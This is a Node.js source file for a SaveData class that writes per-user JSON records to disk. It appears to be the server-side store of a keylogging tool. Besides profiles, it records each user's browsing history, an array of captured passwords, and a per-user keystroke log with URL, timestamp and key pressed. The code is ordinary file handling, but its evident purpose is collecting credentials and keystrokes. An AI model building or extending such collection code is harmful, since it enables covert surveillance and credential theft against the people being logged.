import fs from "fs";

const writeJSON = (path, data) => {
    fs.writeFile(path, JSON.stringify(data, null, 2), function (err) {
        if (err) {
            console.log(err);
        }
    });
};
const appendTXT = (path, text) => fs.appendFileSync(path, text);

const readJSON = (path) => JSON.parse(fs.readFileSync(path, "utf8"));
const fileExists = (path) => fs.existsSync(path);

export default class SaveData {
    constructor() {
        this.dataFolder = "backend/data";
        this.makePath = (uid) => `${this.dataFolder}/${uid}.json`;
        this.makeKeylogPath = (uid) => `${this.dataFolder}/keylog_${uid}.txt`;
        this.data = {};
    }

    /**
     * Gets the user data and stores in this.data[uid]
     * Returns true if data found, and false otherwise.
     */
    getUser(uid) {
        const path = this.makePath(uid);
        if (fileExists(path)) {
            this.data[uid] = readJSON(path);
            return true;
        }
        return false;
    }

    /**
     * Updates the file with currently stored data.
     * Creates new file if file doesnt exist.
     * Does nothing if no stored data on user.
     */
    updateUser(uid) {
        if (this.data[uid]) {
            const path = this.makePath(uid);
            writeJSON(path, this.data[uid]);
        }
    }

    placeholder(text) {
        console.log("called", text);
    }

    addUser(uid, user) {
        // User not already added
        if (!this.getUser(uid)) {
            this.data[uid] = user;
            this.updateUser(uid);
        }
    }

    addHistoryItem(uid, historyItem) {
        console.log("addhistoryitem", historyItem);
        if (this.getUser(uid)) {
            this.data[uid].history.unshift(historyItem);
            this.updateUser(uid);
        }
    }

    addPassword(uid, data) {
        if (this.getUser(uid)) {
            if (!this.data[uid].passwords) {
                this.data[uid].passwords = [data];
            } else {
                this.data[uid].passwords.push(data);
            }
            this.updateUser(uid);
        }
    }

    keypress(uid, time, url, direction, key) {
        if (uid) {
            appendTXT(
                this.makeKeylogPath(uid),
                `${url} ${time} ${direction} '${key}'\n`
            );
        }
    }
}
